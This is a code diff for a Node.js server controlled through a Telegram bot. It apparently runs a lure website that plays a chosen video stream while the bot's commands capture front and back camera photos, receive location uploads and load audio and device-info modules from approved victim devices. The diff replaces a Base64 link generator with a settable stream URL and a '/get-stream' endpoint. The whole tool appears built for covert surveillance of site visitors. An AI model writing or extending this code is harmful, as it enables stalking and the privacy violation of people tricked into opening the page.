@@ -26,11 +26,14 @@ global.pendingSocketId = null;
 global.approvedSocketId = null;
 global.pendingUsername = "Unknown";
 
+// Current active stream link variable (Default YouTube fallback)
+let currentStreamUrl = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
+
 // Automatically register ALL commands in Telegram Menu
 bot.setMyCommands([
     { command: 'start', description: 'Start bot & check status' },
     { command: 'approve', description: 'Authorize pending device' },
-    { command: 'url', description: 'Generate Base64 Stream Link (/url <link>)' },
+    { command: 'url', description: 'Set active stream link (/url <link>)' },
     { command: 'moref', description: 'Front Camera 5 Photos' },
     { command: 'moreb', description: 'Back Camera 5 Photos' },
     { command: 'moreff', description: 'Front Camera with Screen Flash' },
@@ -54,9 +57,7 @@ require('./modules/location')(app);
 require('./modules/info')(app);
 require('./modules/audio')(app);
 
-// ==========================================
-// NAYA: Location Receive karne ka Route
-// ==========================================
+// Location Receive Route
 app.post('/upload-location', (req, res) => {
     const { lat, lon } = req.body;
     if (lat && lon) {
@@ -67,6 +68,11 @@ app.post('/upload-location', (req, res) => {
     } else {
         res.status(400).send({ success: false });
     }
+});
+
+// API Route to provide the current stream URL to the frontend
+app.get('/get-stream', (req, res) => {
+    res.json({ url: currentStreamUrl });
 });
 
 io.on('connection', (socket) => {
@@ -108,23 +114,12 @@ bot.onText(/\/approve/, (msg) => {
     }
 });
 
-// ==========================================
-// NAYA: Telegram /url Command Handler
-// ==========================================
+// Telegram /url command handler to update the active stream URL seamlessly
 bot.onText(/\/url (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        const streamLink = match[1];
-        try {
-            const base64Encoded = Buffer.from(streamLink).toString('base64');
-            // Apni website ka domain yahan replace kar lena (jaise Render ya Vercel link)
-            const myDomain = "https://your-app-name.onrender.com"; 
-            const finalLink = `${myDomain}/?v=${base64Encoded}`;
-
-            bot.sendMessage(chatId, `✅ **Stream Link Generated:**\n\n\`${finalLink}\``, { parse_mode: 'Markdown' });
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: Link generate nahi ho paya.`);
-        }
+        currentStreamUrl = match[1];
+        bot.sendMessage(chatId, `✅ **Aapka link set ho chuka hai!**\n\nAb koi bhi main website kholega toh yeh naya stream play hoga.`);
     }
 });
 
